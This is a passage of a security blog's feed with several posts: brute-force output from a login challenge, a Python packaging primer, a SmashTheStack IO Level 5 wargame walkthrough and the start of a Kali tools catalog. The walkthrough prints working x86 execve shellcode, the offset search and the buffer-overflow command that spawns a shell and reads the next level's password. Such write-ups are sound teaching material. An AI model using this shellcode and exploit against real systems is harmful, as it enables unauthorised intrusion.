<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>

<p>Here is a snippet of the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Try 0 - email: jack@pentesteracademy.com password: xxxxx
</span><span class='line'>Try 1 - email: jack@pentesteracademy.com password: xxxxy
</span><span class='line'>...
</span><span class='line'>Try 477 - email: admin@pentesteracademy.com password: zzzxx
</span><span class='line'>Try 478 - email: admin@pentesteracademy.com password: zzzxy
</span><span class='line'>{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}</span></code></pre></td></tr></table></div></figure>


<p>Today&rsquo;s fortune cookie:</p>

<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
are making another attack.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introduction to Python packaging]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/20/introduction-to-python-packaging/"/>
    <updated>2014-07-20T22:14:31+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/20/introduction-to-python-packaging</id>
    <content type="html"><![CDATA[<p>There is a lot of confusion and heated debate over the Python packaging system. In this post I want to cover the basics of it so it&rsquo;s easier to understand.</p>

<!-- more -->


<p>One of the strengths of the Python programming language is its rich standard library that contains many useful modules suited for various tasks. However, more often than not, you will need to enhance the already rich standard library with additional, third party packages that are not installed by default. So, how do you install new packages?</p>

<h4>What is a package?</h4>

<p>First of all, a package in Python is simply a directory that contains a file named <code><strong>init</strong>.py</code>. You can make your own packages by creating a directory with your desired name and creating an init file like the above inside it. Then you can import your package like you do with the rest.</p>

<h4>The manual way</h4>

<p>Of course, it&rsquo;s possible to manually install packages by unpacking their respective tarballs and dropping them in the directory where modules are installed. On Windows, this directory is called <strong>site-packages</strong> and it can be found in your Python install directory: <code>C:\Python27\Lib\site-packages</code>. On Linux, it&rsquo;s named <strong>dist-packages</strong> and you can find it in <code>/usr/lib/python2.7/dist-packages</code>. Remember to account for your actual installation directories and Python versions, these are the examples from my machines.</p>

<h4>Using a package manager</h4>

<p>A package manager is supposed to ease the process of installing and maintaining packages in a centralized way. This is the more convenient way of installing new Python packages. Here are some benefits of packaging as explained on <a href="http://guide.python-distribute.org/introduction.html">The Hitchhiker’s Guide to Packaging</a>:</p>

<blockquote><ul>
<li>Dependency management</li>
</ul>


<p>Often, the package you want to install requires that others be there. A package management system can
automatically resolve dependencies and make your installation pain free and quick. This is one of the basic
facilities offered by distutils. However, other extensions to distutils do a better job of installing
dependencies.</p>

<ul>
<li>Accounting</li>
</ul>


<p>Package managers can maintain lists of things installed and other metadata like the version installed etc.
which makes is easy for the user to know what are the things his system has.</p>

<ul>
<li>Uninstall</li>
</ul>


<p>Package managers can give you push button ways of removing a package from your environment.</p>

<ul>
<li>Search</li>
</ul>


<p>Find packages by searching a package index for specific terminology</p></blockquote>

<p><strong>distutils</strong></p>

<p>The standard package manager that comes preinstalled with Python is distutils. The standard distribution follows a certain pattern, such as the archive name and unpacking directory having a name composed from the name and version of the distribution, like so: <code>name-version</code>. Here&rsquo;s an example: <code>foo-1.0</code>.</p>

<p>Also, the distribution should contain a setup script called <code>setup.py</code> and a README file with instructions on how to install it. The command <code>python setup.py install</code> is used for building and installation. If you want to break up this process, you can choose to build it yourself first, by running <code>python setup.py build</code>, This will put the files that are to be installed in a build directory. Afterwards, you can run the install command to copy these files in your install directory.</p>

<p><strong>setuptools</strong></p>

<p>setuptools is supposed to enhance the features of distutils. It brings to the table a module called <strong>easy_install</strong> that lets you automatically download, build, install, and manage Python packages.</p>

<p>To install setuptools, you have to run the <a href="https://bootstrap.pypa.io/ez_setup.py"><em>ez_setup.py</em></a> script. And to install a package with easy_install, you just do <code>easy_install package name</code>.</p>

<p><strong>pip</strong></p>

<p>pip is an alternative Python package installer. It performs the same basic job as easy_install, but with some extra features. It can work with version control repositories (currently only Git, Mercurial, andBazaar repositories), logs output extensively, and prevents partial installs by downloading all requirements before starting installation.</p>

<p>To install pip, download and run <a href="https://bootstrap.pypa.io/get-pip.py"><em>get-pip.py</em></a>. With pip you can easily manage your Python packages from the command line:</p>

<ul>
<li><p>install a package: <code>pip install package name</code></p></li>
<li><p>uninstall a package: <code>pip uninstall package name</code></p></li>
<li><p>upgrade a package to its latest version: <code>pip install -U package name</code> (alternatively, you can also use the &mdash;upgrade flag)</p></li>
<li><p>list installed packages: <code>pip list</code></p></li>
<li><p>show information about one or more installed packages <code>pip show package name</code></p></li>
</ul>


<p>Due to its features and convenience, pip is my favorite package installer. Of course, there are more advanced features in Python packaging, but I hope this introduction was helpful for getting to install and manage your packages.</p>

<blockquote><p>You will stop at nothing to reach your objective, but only because your brakes are defective.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
    <updated>2014-07-18T20:08:18+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>

<!-- more -->


<p>Code for level05.c:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>

<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cm">/* Get env var location. */</span>
</span><span class='line'>        <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span> <span class="cm">/* Adjust for program name. */</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')</span></code></pre></td></tr></table></div></figure>


<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span></code></pre></td></tr></table></div></figure>


<p>Run the program in GDB with the pattern and then get the offset:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x37654136 in ?? ()
</span><span class='line'>
</span><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140</span></code></pre></td></tr></table></div></figure>


<p>Now get the address of our environment variable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
</span><span class='line'>PWN will be at 0xbfffff53</span></code></pre></td></tr></table></div></figure>


<p>Profit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
</span><span class='line'>sh-4.2$ whoami
</span><span class='line'>level6
</span><span class='line'>sh-4.2$ cat /home/level6/.pass
</span><span class='line'>9BT8fmYDTPimXXhY3m</span></code></pre></td></tr></table></div></figure>


<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//don&#39;t get trapped, there&#39;s no need</span>
</span><span class='line'><span class="c1">//level by bla</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define LOADERSIZE (232 + 16)</span>
</span><span class='line'><span class="kt">void</span><span class="o">*</span> <span class="nf">getASLRregion</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">switchcontext</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">newstack</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">code</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">env</span><span class="p">[])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">newcode</span><span class="p">,</span> <span class="o">*</span><span class="n">newstack</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//allocate memory at random addresses</span>
</span><span class='line'>  <span class="n">newstack</span> <span class="o">=</span> <span class="n">getASLRregion</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="p">);</span>
</span><span class='line'>  <span class="n">newcode</span> <span class="o">=</span>  <span class="n">getASLRregion</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xcd</span><span class="p">))</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xe8</span><span class="p">))</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;</span><span class="se">\x0F\x34</span><span class="s">&quot;</span><span class="p">))</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strchr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xdb</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">//prepare new code section, leaving some space for a loader</span>
</span><span class='line'>      <span class="n">strncpy</span><span class="p">(</span><span class="n">newcode</span> <span class="o">+</span> <span class="n">LOADERSIZE</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1000</span><span class="p">);</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c1">//start executing using a new stack and code section.</span>
</span><span class='line'>      <span class="n">switchcontext</span><span class="p">(</span><span class="n">newstack</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">newcode</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/*************************************************************************************************************************/</span>
</span><span class='line'><span class="cm">/* HALT! The code below only provides a controllable aslr/noexec for this challenge, there&#39;s no need to waste time on it */</span>
</span><span class='line'><span class="cm">/*************************************************************************************************************************/</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="n">initializePRNG</span><span class="p">(){</span><span class="kt">int</span> <span class="n">seed</span><span class="p">;</span><span class="kt">FILE</span><span class="o">*</span><span class="n">devrand</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/dev/random&quot;</span><span class="p">,</span><span class="s">&quot;r&quot;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">devrand</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">seed</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">devrand</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span><span class="n">fclose</span><span class="p">(</span><span class="n">devrand</span><span class="p">);</span><span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);}</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">loader</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mh">0xe899c031</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span><span class="kt">void</span><span class="o">*</span>
</span><span class='line'><span class="nf">getASLRregion</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">){</span><span class="kt">int</span> <span class="n">tries</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="n">hint</span><span class="p">,</span><span class="n">res</span><span class="p">;</span><span class="k">while</span><span class="p">(</span><span class="n">tries</span><span class="o">--</span><span class="p">){</span><span class="n">hint</span><span class="o">=</span><span class="n">rand</span><span class="p">()</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">;</span><span class="n">res</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">hint</span><span class="p">,</span><span class="n">size</span>
</span><span class='line'><span class="o">+</span><span class="mi">4096</span><span class="p">,</span><span class="n">flags</span><span class="p">,</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="n">hint</span><span class="o">==</span><span class="n">res</span><span class="p">){</span><span class="n">loader</span><span class="p">[</span><span class="o">++</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">hint</span><span class="p">;</span><span class="k">return</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">res</span><span class="o">+</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">&amp;</span><span class="mh">0xffc</span><span class="p">));}</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">munmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">res</span><span class="p">,</span><span class="n">size</span><span class="o">+</span><span class="mi">4096</span><span class="p">))</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span><span class="kt">void</span> <span class="nf">switchcontext</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="n">newstack</span><span class="p">,</span><span class="kt">char</span><span class="o">*</span><span class="n">code</span><span class="p">){</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">&lt;&lt;=</span><span class="mi">2</span><span class="p">;</span><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span>
</span><span class='line'><span class="p">,</span><span class="n">loader</span><span class="p">,</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span><span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="o">+</span><span class="n">loader</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xf3\xab\x31\xff</span><span class="s">&quot;</span><span class="p">,</span><span class="n">LOADERSIZE</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span><span class="n">asm</span><span class="p">(</span><span class="s">&quot;mov %0, %%esp</span><span class="se">\n</span><span class="s">mov %1,%%eax</span><span class="se">\n</span><span class="s">jmp *%%eax&quot;</span><span class="o">::</span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">newstack</span><span class="o">-</span><span class="mi">4</span><span class="p">),</span><span class="s">&quot;r&quot;</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">:</span><span class="s">&quot;eax&quot;</span><span class="p">);}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Function overview</h4>

<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>

<p>PROT_EXEC  Pages may be executed.</p>

<p>PROT_READ  Pages may be read.</p>

<p>PROT_WRITE Pages may be written.</p>

<p><strong>strchr</strong></p>

<p><em>char <em>strchr(const char </em>str, int ch);</em></p>

<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>

<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>

<p>I will come back to this at a later time.</p>

<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Information Gathering]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/17/kali-tools-catalog-information-gathering/"/>
    <updated>2014-07-17T21:25:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/17/kali-tools-catalog-information-gathering</id>
    <content type="html"><![CDATA[<p>Kali is an awesome distribution for pentesting. But with so many choices, one may find it daunting to find a specific tool for a task without having used it before. Or maybe you&rsquo;re wondering about some tools but don&rsquo;t feel like testing every single one. So I decided to briefly go over the tools provided by Kali and provide a quick description. Where available, I will use the ones presented on their respective websites / manpages etc.</p>

<p>So, let&rsquo;s begin!</p>

<!-- more -->


<h3>DNS Analysis</h3>

<p><strong>dnsdict6</strong></p>

<p>Enumerates a domain for DNS entries, it uses a dictionary file if supplied or a built-in list otherwise. This tool is based on dnsmap by gnucitizen.org.</p>

<p><strong>dnsenum</strong></p>

<p>Multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.</p>

<p><strong>dnsmap</strong></p>

<p>dnsmap is mainly meant to be used by pentesters during the informatio ngathering/enumeration phase of infrastructure security assessments. During the enumeration stage, the security consultant would typically discover the target company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

